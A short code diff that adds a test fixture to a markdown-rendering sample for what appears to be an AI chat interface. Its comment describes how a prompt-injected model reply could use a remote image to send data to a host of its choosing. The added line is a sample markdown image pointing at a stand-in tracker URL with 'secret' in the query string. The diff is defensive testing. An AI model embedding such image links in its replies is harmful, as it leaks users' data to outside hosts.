@@ -82,6 +82,12 @@
     '$$E = mc^2$$',
     '',
     'Mehr bei [Wikipedia](https://de.wikipedia.org/wiki/Mittelmeer).',
+    '',
+    // The one markdown feature that must NOT render: a remote picture. react-markdown
+    // would build an `<img>` and the webview would fetch it, which is how a
+    // prompt-injected reply could send a request (and whatever it put in the query
+    // string) to a host of its choosing. The alt text is what should appear.
+    'Ein Bild aus dem Netz: ![nicht laden](https://example.invalid/tracker.png?q=secret)',
   ].join('\n')
 
   const REASONING =
